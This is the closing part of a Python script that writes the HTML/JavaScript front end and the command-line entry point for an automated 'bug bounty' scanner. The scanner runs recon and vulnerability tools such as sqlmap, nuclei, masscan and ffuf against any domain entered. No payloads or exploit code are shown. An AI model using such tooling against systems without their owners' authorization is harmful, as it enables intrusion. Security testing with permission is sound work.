            margin-bottom: 25px;
        }

        .summary-card {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: transform 0.3s ease;
        }

        .summary-card:hover {
            transform: scale(1.05);
        }

        .summary-number {
            font-size: 2rem;
            font-weight: bold;
            color: #00ff88;
            margin-bottom: 5px;
        }

        .summary-label {
            opacity: 0.8;
            font-size: 0.9rem;
        }

        .detailed-results {
            margin-top: 20px;
        }

        .result-section {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            margin-bottom: 15px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .section-header {
            background: rgba(0, 255, 136, 0.1);
            padding: 15px 20px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: background 0.3s ease;
        }

        .section-header:hover {
            background: rgba(0, 255, 136, 0.2);
        }

        .section-content {
            padding: 20px;
            display: none;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .section-content.expanded {
            display: block;
        }

        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.9rem;
            font-weight: 600;
        }

        .status-running {
            background: rgba(255, 204, 0, 0.2);
            color: #ffcc00;
            border: 1px solid rgba(255, 204, 0, 0.3);
        }

        .status-completed {
            background: rgba(0, 255, 136, 0.2);
            color: #00ff88;
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .status-stopped {
            background: rgba(255, 71, 87, 0.2);
            color: #ff4757;
            border: 1px solid rgba(255, 71, 87, 0.3);
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 204, 0, 0.3);
            border-top: 2px solid #ffcc00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .result-item {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            border-left: 4px solid #00ff88;
        }

        .result-preview {
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            opacity: 0.8;
            margin-top: 10px;
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 5px;
            max-height: 150px;
            overflow-y: auto;
        }

        .hidden {
            display: none !important;
        }

        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 4px solid;
            animation: slideIn 0.5s ease-out;
        }

        .alert-info {
            background: rgba(0, 204, 255, 0.1);
            border-left-color: #00ccff;
            color: #00ccff;
        }

        .alert-success {
            background: rgba(0, 255, 136, 0.1);
            border-left-color: #00ff88;
            color: #00ff88;
        }

        .alert-warning {
            background: rgba(255, 204, 0, 0.1);
            border-left-color: #ffcc00;
            color: #ffcc00;
        }

        .alert-error {
            background: rgba(255, 71, 87, 0.1);
            border-left-color: #ff4757;
            color: #ff4757;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 15px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            width: 0%;
            transition: width 0.5s ease;
            animation: progressShine 2s infinite;
        }

        @keyframes progressShine {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            opacity: 0.6;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .header h1 {
                font-size: 2.5rem;
            }
            
            .scan-types {
                grid-template-columns: 1fr;
            }
            
            .control-buttons {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                margin-bottom: 10px;
            }
        }

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, #00ff88, #00ccff);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, #00ccff, #ff0080);
        }

        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9rem;
            font-weight: 600;
            z-index: 1000;
        }

        .connected {
            background: rgba(0, 255, 136, 0.2);
            color: #00ff88;
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .disconnected {
            background: rgba(255, 71, 87, 0.2);
            color: #ff4757;
            border: 1px solid rgba(255, 71, 87, 0.3);
        }
    </style>
</head>
<body>
    <div class="connection-status" id="connectionStatus">
        <i class="fas fa-circle"></i> Connecting...
    </div>

    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-halved"></i> Advanced Bug Bounty Scanner</h1>
            <p>Professional reconnaissance and vulnerability assessment platform</p>
            <div class="status-indicator" id="scanStatus">
                <i class="fas fa-circle"></i> Ready to scan
            </div>
        </div>

        <div class="scan-controls">
            <div class="input-group">
                <label for="targetInput">
                    <i class="fas fa-bullseye"></i> Target Domain
                </label>
                <input 
                    type="text" 
                    id="targetInput" 
                    class="target-input" 
                    placeholder="Enter target domain (e.g., example.com)"
                    pattern = "[a-zA-Z0-9.-]+[a-zA-Z]{2,}"

                >
            </div>

            <div class="input-group">
                <label><i class="fas fa-cogs"></i> Scan Types</label>
                <div class="scan-types">
                    <div class="scan-type" data-type="subdomain">
                        <input type="checkbox" id="subdomain" value="subdomain">
                        <div class="scan-type-icon"><i class="fas fa-sitemap"></i></div>
                        <h3>Subdomain Enumeration</h3>
                        <p>Discover subdomains, check for takeovers</p>
                    </div>
                    
                    <div class="scan-type" data-type="reconnaissance">
                        <input type="checkbox" id="reconnaissance" value="reconnaissance">
                        <div class="scan-type-icon"><i class="fas fa-search"></i></div>
                        <h3>Reconnaissance</h3>
                        <p>Port scanning, directory enumeration</p>
                    </div>
                    
                    <div class="scan-type" data-type="url_collection">
                        <input type="checkbox" id="url_collection" value="url_collection">
                        <div class="scan-type-icon"><i class="fas fa-link"></i></div>
                        <h3>URL Collection</h3>
                        <p>Passive URL gathering and analysis</p>
                    </div>
                    
                    <div class="scan-type" data-type="sensitive_data">
                        <input type="checkbox" id="sensitive_data" value="sensitive_data">
                        <div class="scan-type-icon"><i class="fas fa-eye"></i></div>
                        <h3>Sensitive Data</h3>
                        <p>Find exposed files and information</p>
                    </div>
                    
                    <div class="scan-type" data-type="vulnerability">
                        <input type="checkbox" id="vulnerability" value="vulnerability">
                        <div class="scan-type-icon"><i class="fas fa-bug"></i></div>
                        <h3>Vulnerability Scan</h3>
                        <p>XSS, CORS, SQL injection testing</p>
                    </div>
                    
                    <div class="scan-type" data-type="advanced">
                        <input type="checkbox" id="advanced" value="advanced">
                        <div class="scan-type-icon"><i class="fas fa-rocket"></i></div>
                        <h3>Advanced Testing</h3>
                        <p>LFI, parameter discovery, WordPress</p>
                    </div>
                </div>
            </div>

            <div class="control-buttons">
                <button class="btn btn-primary" id="startScanBtn">
                    <i class="fas fa-play"></i> Start Scan
                </button>
                <button class="btn btn-danger" id="stopScanBtn" disabled>
                    <i class="fas fa-stop"></i> Stop Scan
                </button>
            </div>
        </div>

        <div class="scan-output hidden" id="scanOutput">
            <div class="output-header">
                <div class="output-title">
                    <i class="fas fa-terminal"></i> Live Scan Output
                </div>
                <div class="scan-info">
                    <span id="scanTarget">Target: -</span>
                    <span id="scanTime">Time: 00:00</span>
                    <span id="scanProgress">Progress: 0%</span>
                </div>
            </div>
            <div class="output-content" id="outputContent">
                <!-- Live output will appear here -->
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>

        <div class="results-summary hidden" id="resultsSummary">
            <h2><i class="fas fa-chart-bar"></i> Scan Results Summary</h2>
            <div class="summary-grid" id="summaryGrid">
                <!-- Summary cards will be populated here -->
            </div>
            <div class="detailed-results" id="detailedResults">
                <!-- Detailed results will be populated here -->
            </div>
        </div>
    </div>

    <div class="footer">
        <p>&copy; 2025 Advanced Bug Bounty Scanner | Professional Security Testing Platform</p>
    </div>

    <script>
        // Global variables
        let socket;
        let currentScanId = null;
        let scanStartTime = null;
        let timerInterval = null;
        let selectedScanTypes = new Set();

        // Initialize application
        document.addEventListener('DOMContentLoaded', function() {
            initializeSocket();
            initializeEventListeners();
            updateConnectionStatus(false);
        });

        function initializeSocket() {
            socket = io();
            
            socket.on('connect', function() {
                console.log('Connected to server');
                updateConnectionStatus(true);
            });

            socket.on('disconnect', function() {
                console.log('Disconnected from server');
                updateConnectionStatus(false);
            });

            socket.on('scan_progress', function(data) {
                handleScanProgress(data);
            });

            socket.on('connected', function(data) {
                console.log('Server connection confirmed:', data.message);
            });
        }

        function updateConnectionStatus(connected) {
            const statusEl = document.getElementById('connectionStatus');
            if (connected) {
                statusEl.className = 'connection-status connected';
                statusEl.innerHTML = '<i class="fas fa-circle"></i> Connected';
            } else {
                statusEl.className = 'connection-status disconnected';
                statusEl.innerHTML = '<i class="fas fa-circle"></i> Disconnected';
            }
        }

        function initializeEventListeners() {
            // Scan type selection
            document.querySelectorAll('.scan-type').forEach(scanType => {
                scanType.addEventListener('click', function() {
                    const checkbox = this.querySelector('input');
                    const type = this.dataset.type;
                    
                    if (selectedScanTypes.has(type)) {
                        selectedScanTypes.delete(type);
                        this.classList.remove('selected');
                        checkbox.checked = false;
                    } else {
                        selectedScanTypes.add(type);
                        this.classList.add('selected');
                        checkbox.checked = true;
                    }
                    
                    updateStartButton();
                });
            });

            // Start scan button
            document.getElementById('startScanBtn').addEventListener('click', startScan);
            
            // Stop scan button
            document.getElementById('stopScanBtn').addEventListener('click', stopScan);
            
            // Target input validation
            document.getElementById('targetInput').addEventListener('input', function() {
                updateStartButton();
            });

            // Enter key to start scan
            document.getElementById('targetInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    startScan();
                }
            });
        }

        function updateStartButton() {
            const target = document.getElementById('targetInput').value.trim();
            const hasTarget = target.length > 0 && isValidDomain(target);
            const hasTypes = selectedScanTypes.size > 0;
            const isScanning = currentScanId !== null;
            
            const startBtn = document.getElementById('startScanBtn');
            startBtn.disabled = !hasTarget || !hasTypes || isScanning;
        }

        function isValidDomain(domain) {
            const domainRegex = /^[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
            return domainRegex.test(domain);
        }

        async function startScan() {
            const target = document.getElementById('targetInput').value.trim();
            const scanTypes = Array.from(selectedScanTypes);
            
            if (!target || scanTypes.length === 0) {
                showAlert('Please enter a target domain and select at least one scan type', 'error');
                return;
            }

            if (!isValidDomain(target)) {
                showAlert('Please enter a valid domain (e.g., example.com)', 'error');
                return;
            }

            try {
                const response = await fetch('/api/start_scan', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        target: target,
                        scan_types: scanTypes
                    })
                });

                const data = await response.json();
                
                if (response.ok) {
                    currentScanId = data.scan_id;
                    scanStartTime = new Date();
                    
                    // Update UI
                    document.getElementById('scanOutput').classList.remove('hidden');
                    document.getElementById('resultsSummary').classList.add('hidden');
                    document.getElementById('scanTarget').textContent = `Target: ${data.target}`;
                    document.getElementById('startScanBtn').disabled = true;
                    document.getElementById('stopScanBtn').disabled = false;
                    
                    updateScanStatus('running');
                    clearOutput();
                    startTimer();
                    
                    showAlert(`Scan started for ${data.target}`, 'success');
                } else {
                    showAlert(data.error || 'Failed to start scan', 'error');
                }
            } catch (error) {
                showAlert('Connection error: ' + error.message, 'error');
            }
        }

        async function stopScan() {
            if (!currentScanId) return;

            try {
                const response = await fetch('/api/stop_scan', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        scan_id: currentScanId
                    })
                });

                const data = await response.json();
                
                if (response.ok) {
                    updateScanStatus('stopped');
                    showAlert('Scan stopped successfully', 'warning');
                } else {
                    showAlert(data.error || 'Failed to stop scan', 'error');
                }
            } catch (error) {
                showAlert('Connection error: ' + error.message, 'error');
            }
        }

        function handleScanProgress(data) {
            if (data.scan_id !== currentScanId) return;

            const timestamp = data.timestamp;
            const message = data.message;
            const type = data.type;

            if (type === 'complete') {
                // Scan completed
                updateScanStatus('completed');
                stopTimer();
                document.getElementById('startScanBtn').disabled = false;
                document.getElementById('stopScanBtn').disabled = true;
                
                // Show results summary
                displayResults(data.data);
                showAlert('Scan completed successfully!', 'success');
                
                currentScanId = null;
            } else {
                // Regular progress update
                addLogEntry(timestamp, message, type);
                
                // Update progress bar based on message content
                updateProgressBar(message);
            }
        }

        function addLogEntry(timestamp, message, type) {
            const outputContent = document.getElementById('outputContent');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            
            logEntry.innerHTML = `
                <span class="timestamp">[${timestamp}]</span>
                <span class="message">${escapeHtml(message)}</span>
            `;
            
            outputContent.appendChild(logEntry);
            outputContent.scrollTop = outputContent.scrollHeight;
        }

        function updateProgressBar(message) {
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('scanProgress');
            
            let progress = 0;
            
            // Estimate progress based on message content
            if (message.includes('Phase 1')) progress = 10;
            else if (message.includes('Phase 2')) progress = 25;
            else if (message.includes('Phase 3')) progress = 45;
            else if (message.includes('Phase 4')) progress = 65;
            else if (message.includes('Phase 5')) progress = 80;
            else if (message.includes('Phase 6')) progress = 95;
            else if (message.includes('completed')) progress = 100;
            
            if (progress > 0) {
                progressFill.style.width = progress + '%';
                progressText.textContent = `Progress: ${progress}%`;
            }
        }

        function updateScanStatus(status) {
            const statusEl = document.getElementById('scanStatus');
            
            switch (status) {
                case 'running':
                    statusEl.className = 'status-indicator status-running';
                    statusEl.innerHTML = '<div class="spinner"></div> Scanning...';
                    break;
                case 'completed':
                    statusEl.className = 'status-indicator status-completed';
                    statusEl.innerHTML = '<i class="fas fa-check-circle"></i> Scan Completed';
                    break;
                case 'stopped':
                    statusEl.className = 'status-indicator status-stopped';
                    statusEl.innerHTML = '<i class="fas fa-stop-circle"></i> Scan Stopped';
                    break;
                default:
                    statusEl.className = 'status-indicator';
                    statusEl.innerHTML = '<i class="fas fa-circle"></i> Ready to scan';
            }
        }

        function startTimer() {
            timerInterval = setInterval(() => {
                if (scanStartTime) {
                    const elapsed = Math.floor((new Date() - scanStartTime) / 1000);
                    const minutes = Math.floor(elapsed / 60);
                    const seconds = elapsed % 60;
                    document.getElementById('scanTime').textContent = 
                        `Time: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
        }

        function stopTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
        }

        function clearOutput() {
            document.getElementById('outputContent').innerHTML = '';
            document.getElementById('progressFill').style.width = '0%';
            document.getElementById('scanProgress').textContent = 'Progress: 0%';
        }

        function displayResults(summary) {
            const resultsSummary = document.getElementById('resultsSummary');
            const summaryGrid = document.getElementById('summaryGrid');
            const detailedResults = document.getElementById('detailedResults');
            
            // Clear previous results
            summaryGrid.innerHTML = '';
            detailedResults.innerHTML = '';
            
            // Create summary cards
            const summaryCards = [
                { label: 'Total Subdomains', value: summary.total_subdomains, icon: 'fas fa-sitemap' },
                { label: 'Live Subdomains', value: summary.live_subdomains, icon: 'fas fa-globe' },
                { label: 'URLs Collected', value: summary.urls_collected, icon: 'fas fa-link' },
                { label: 'Sensitive Files', value: summary.sensitive_files, icon: 'fas fa-file-alt' },
                { label: 'JS Files', value: summary.js_files, icon: 'fab fa-js-square' },
                { label: 'Vulnerabilities', value: summary.vulnerabilities, icon: 'fas fa-bug' }
            ];
            
            summaryCards.forEach(card => {
                const cardEl = document.createElement('div');
                cardEl.className = 'summary-card';
                cardEl.innerHTML = `
                    <div class="summary-number">${card.value}</div>
                    <div class="summary-label">
                        <i class="${card.icon}"></i> ${card.label}
                    </div>
                `;
                summaryGrid.appendChild(cardEl);
            });
            
            // Create detailed results sections
            Object.entries(summary.detailed_results).forEach(([phase, phaseData]) => {
                const sectionEl = document.createElement('div');
                sectionEl.className = 'result-section';
                
                const headerEl = document.createElement('div');
                headerEl.className = 'section-header';
                headerEl.innerHTML = `
                    <span><i class="fas fa-folder"></i> ${formatPhaseName(phase)}</span>
                    <i class="fas fa-chevron-down"></i>
                `;
                
                const contentEl = document.createElement('div');
                contentEl.className = 'section-content';
                
                // Add phase results
                Object.entries(phaseData).forEach(([step, stepData]) => {
                    const itemEl = document.createElement('div');
                    itemEl.className = 'result-item';
                    
                    let previewContent = '';
                    if (stepData.preview && stepData.preview.length > 0) {
                        previewContent = `
                            <div class="result-preview">
                                ${stepData.preview.map(item => escapeHtml(item)).join('\n')}
                                ${stepData.count > 5 ? `\n... and ${stepData.count - 5} more items` : ''}
                            </div>
                        `;
                    }
                    
                    itemEl.innerHTML = `
                        <h4>${formatStepName(step)}</h4>
                        <p>Found ${stepData.count} items</p>
                        ${previewContent}
                    `;
                    
                    contentEl.appendChild(itemEl);
                });
                
                // Add click handler for expand/collapse
                headerEl.addEventListener('click', function() {
                    const isExpanded = contentEl.classList.contains('expanded');
                    const icon = this.querySelector('i.fa-chevron-down, i.fa-chevron-up');
                    
                    if (isExpanded) {
                        contentEl.classList.remove('expanded');
                        icon.className = 'fas fa-chevron-down';
                    } else {
                        contentEl.classList.add('expanded');
                        icon.className = 'fas fa-chevron-up';
                    }
                });
                
                sectionEl.appendChild(headerEl);
                sectionEl.appendChild(contentEl);
                detailedResults.appendChild(sectionEl);
            });
            
            resultsSummary.classList.remove('hidden');
        }

        function formatPhaseName(phase) {
            return phase.replace(/_/g, ' ').replace(/\b\\w/g, l => l.toUpperCase());
        }

        function formatStepName(step) {
            return step.replace(/_/g, ' ').replace(/\b\\w/g, l => l.toUpperCase());
        }

        function showAlert(message, type) {
            // Remove existing alerts
            document.querySelectorAll('.alert').forEach(alert => alert.remove());
            
            const alertEl = document.createElement('div');
            alertEl.className = `alert alert-${type}`;
            alertEl.innerHTML = `
                <i class="fas fa-${getAlertIcon(type)}"></i>
                ${escapeHtml(message)}
            `;
            
            const container = document.querySelector('.container');
            container.insertBefore(alertEl, container.firstChild);
            
            // Auto remove after 5 seconds
            setTimeout(() => {
                alertEl.remove();
            }, 5000);
        }

        function getAlertIcon(type) {
            switch (type) {
                case 'success': return 'check-circle';
                case 'warning': return 'exclamation-triangle';
                case 'error': return 'times-circle';
                default: return 'info-circle';
            }
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Utility functions for enhanced user experience
        function resetScan() {
            currentScanId = null;
            scanStartTime = null;
            stopTimer();
            
            document.getElementById('startScanBtn').disabled = false;
            document.getElementById('stopScanBtn').disabled = true;
            document.getElementById('scanOutput').classList.add('hidden');
            
            updateScanStatus('ready');
        }

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey || e.metaKey) {
                switch (e.key) {
                    case 'Enter':
                        e.preventDefault();
                        if (!currentScanId) startScan();
                        break;
                    case 'Escape':
                        e.preventDefault();
                        if (currentScanId) stopScan();
                        break;
                }
            }
        });

        // Auto-save target and scan types to localStorage
        function savePreferences() {
            const target = document.getElementById('targetInput').value;
            const types = Array.from(selectedScanTypes);
            
            localStorage.setItem('bugbounty_target', target);
            localStorage.setItem('bugbounty_scan_types', JSON.stringify(types));
        }

        function loadPreferences() {
            const savedTarget = localStorage.getItem('bugbounty_target');
            const savedTypes = JSON.parse(localStorage.getItem('bugbounty_scan_types') || '[]');
            
            if (savedTarget) {
                document.getElementById('targetInput').value = savedTarget;
            }
            
            savedTypes.forEach(type => {
                const scanTypeEl = document.querySelector(`[data-type="${type}"]`);
                if (scanTypeEl) {
                    scanTypeEl.click();
                }
            });
            
            updateStartButton();
        }

        // Load preferences on page load
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(loadPreferences, 100);
        });

        // Save preferences when changed
        document.getElementById('targetInput').addEventListener('input', savePreferences);
        document.querySelectorAll('.scan-type').forEach(el => {
            el.addEventListener('click', () => setTimeout(savePreferences, 100));
        });

        // Health check every 30 seconds
        setInterval(async function() {
            try {
                const response = await fetch('/api/health');
                const data = await response.json();
                
                if (!response.ok) {
                    updateConnectionStatus(false);
                }
            } catch (error) {
                updateConnectionStatus(false);
            }
        }, 30000);

        // Page visibility API to handle tab switching
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                // Page is hidden
                console.log('Page hidden - scan continues in background');
            } else {
                // Page is visible
                console.log('Page visible - resuming updates');
                if (currentScanId) {
                    // Refresh scan status
                    fetch(`/api/scan_status/${currentScanId}`)
                        .then(response => response.json())
                        .then(data => {
                            if (!data.active) {
                                // Scan completed while page was hidden
                                fetch(`/api/results/${currentScanId}`)
                                    .then(response => response.json())
                                    .then(results => {
                                        displayResults(results);
                                        updateScanStatus('completed');
                                        currentScanId = null;
                                    });
                            }
                        })
                        .catch(console.error);
                }
            }
        });

        // Add copy to clipboard functionality
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showAlert('Copied to clipboard!', 'success');
            }).catch(err => {
                showAlert('Failed to copy to clipboard', 'error');
            });
        }

        // Add download results functionality
        function downloadResults() {
            if (!currentScanId) {
                showAlert('No scan results to download', 'warning');
                return;
            }
            
            fetch(`/api/results/${currentScanId}`)
                .then(response => response.json())
                .then(data => {
                    const blob = new Blob([JSON.stringify(data, null, 2)], {
                        type: 'application/json'
                    });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `scan_results_${new Date().toISOString().split('T')[0]}.json`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    showAlert('Results downloaded successfully!', 'success');
                })
                .catch(error => {
                    showAlert('Failed to download results', 'error');
                });
        }

        // Initialize tooltips and help system
        function initializeHelp() {
            const helpBtn = document.createElement('button');
            helpBtn.className = 'btn btn-info';
            helpBtn.innerHTML = '<i class="fas fa-question-circle"></i> Help';
            helpBtn.style.position = 'fixed';
            helpBtn.style.bottom = '20px';
            helpBtn.style.right = '20px';
            helpBtn.style.zIndex = '1000';
            
            helpBtn.addEventListener('click', showHelp);
            document.body.appendChild(helpBtn);
        }

        function showHelp() {
            const helpContent = `
                <h3>How to Use the Bug Bounty Scanner</h3>
                <ul>
                    <li><strong>Target Domain:</strong> Enter the target domain (e.g., example.com)</li>
                    <li><strong>Scan Types:</strong> Select one or more scan types to run</li>
                    <li><strong>Keyboard Shortcuts:</strong> Ctrl+Enter to start, Escape to stop</li>
                    <li><strong>Results:</strong> View live output and download results when complete</li>
                </ul>
                <p><strong>Note:</strong> Ensure you have proper authorization before scanning any target.</p>
            `;
            
            showAlert(helpContent, 'info');
        }

        // Initialize help system
        document.addEventListener('DOMContentLoaded', initializeHelp);

        // Error handling for WebSocket connection
        window.addEventListener('beforeunload', function(e) {
            if (currentScanId) {
                e.preventDefault();
                e.returnValue = 'A scan is currently running. Are you sure you want to leave?';
                return e.returnValue;
            }
        });

        console.log('🚀 Bug Bounty Scanner initialized successfully');
    </script>
</body>
</html>"""
    
    # Create templates directory
    template_dir = Path("templates")
    template_dir.mkdir(exist_ok=True)
    
    with open(template_dir / "index.html", 'w') as f:
        f.write(html_template)


def main():
    """Main function with CLI interface"""
    parser = argparse.ArgumentParser(description='Advanced Bug Bounty Automation Tool')
    parser.add_argument('--target', '-t', help='Target domain (e.g., example.com)')
    parser.add_argument('--output', '-o', default='results', help='Output directory')
    parser.add_argument('--web', '-w', action='store_true', help='Start web interface')
    parser.add_argument('--port', '-p', type=int, default=5000, help='Web interface port')
    parser.add_argument('--host', default='0.0.0.0', help='Web interface host')
    parser.add_argument('--threads', '-th', type=int, default=50, help='Number of threads')
    parser.add_argument('--timeout', '-to', type=int, default=600, help='Command timeout')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.web:
        # Create HTML template
        create_html_template()
        
        # Start web interface
        print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                 🔍 Advanced Bug Bounty Scanner               ║
    ║                        Web Interface                         ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  Server: http://{args.host}:{args.port}                      ║       ║
    ║  Features: All 74+ commands integrated                       ║
    ║  Methods: Subdomain enum, URL collection, Vuln scanning      ║
    ╚══════════════════════════════════════════════════════════════╝
        """)
        
        web_interface = WebInterface()
        web_interface.run(host=args.host, port=args.port, debug=args.verbose)
        
    elif args.target:
        # CLI mode
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                 🔍 Advanced Bug Bounty Scanner               ║
║                         CLI Mode                             ║
╠══════════════════════════════════════════════════════════════╣
║  Target: {args.target:<50}                                   ║
║  Output: {args.output:<50}                                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        scanner = AdvancedBugBountyTool(args.target, args.output)
        results = scanner.run_full_scan()
        
        print(f"\n✅ Scan completed! Results saved to: {scanner.output_dir}")
        print(f"📊 Statistics:")
        print(f"   - Subdomains: {len(results['subdomains'])}")
        print(f"   - Live Subdomains: {len(results['live_subdomains'])}")
        print(f"   - URLs: {len(results['urls'])}")
        print(f"   - Vulnerabilities: {len(results.get('vulnerabilities', []))}")
        print(f"   - Sensitive Files: {len(results['sensitive_files'])}")
        
    else:
        print("""
╔══════════════════════════════════════════════════════════════╗
║                 🔍 Advanced Bug Bounty Scanner               ║
║                    Usage Instructions                        ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  CLI Mode:                                                   ║
║    python3 script.py -t example.com                          ║
║                                                              ║
║  Web Interface:                                              ║
║    python3 script.py --web                                   ║
║    Then visit: http://localhost:5000                         ║
║                                                              ║
║  Advanced Options:                                           ║
║    --port 8080        (Custom port)                          ║
║    --host 0.0.0.0     (Custom host)                          ║
║    --output results   (Custom output directory)              ║
║    --threads 100      (Custom thread count)                  ║
║    --verbose          (Verbose logging)                      ║
║                                                              ║
║  Features Included (74+ Commands):                           ║
║    ✓ Subfinder, Assetfinder, DNS bruteforce                  ║
║    ✓ Httpx, Httprobe, Manual live checking                   ║
║    ✓ Katana, GAU, Wayback machine                            ║
║    ✓ Nuclei, SQLMap, XSStrike, Dalfox                        ║
║    ✓ Arjun, FFUF, Dirsearch                                  ║
║    ✓ WPScan, CORScanner, Subzy                               ║
║    ✓ Nmap, Masscan, Naabu                                    ║
║    ✓ S3Scanner, Git detection                                ║
║    ✓ API key extraction, Header injection                    ║
║    ✓ Content type analysis, Shodan integration               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """)


if __name__ == "__main__":
    # Required dependencies check
    required_tools = [
        'subfinder', 'httpx-toolkit', 'katana', 'nuclei', 'nmap', 
        'ffuf', 'sqlmap', 'arjun', 'gau', 'assetfinder', 'httprobe'
    ]
    
    missing_tools = []
    for tool in required_tools:
        result = subprocess.run(['which', tool], capture_output=True)
        if result.returncode != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"⚠️  Warning: Missing tools: {', '.join(missing_tools)}")
        print("The script will still run but some features may not work.")
        print("Install missing tools for full functionality.")
    
    # Check Python dependencies
    try:
        import requests
        import flask
        import flask_cors
        import dns.resolver
        import bs4
    except ImportError as e:
        print(f"❌ Missing Python dependency: {e}")
        print("Install with: pip install requests flask flask-cors dnspython beautifulsoup4")
        sys.exit(1)
    
    print("🔍 Advanced Bug Bounty Scanner - Ready!")
    print("📋 All 74+ commands from your list are integrated")
    print("🚀 Starting application...")
    
    main()
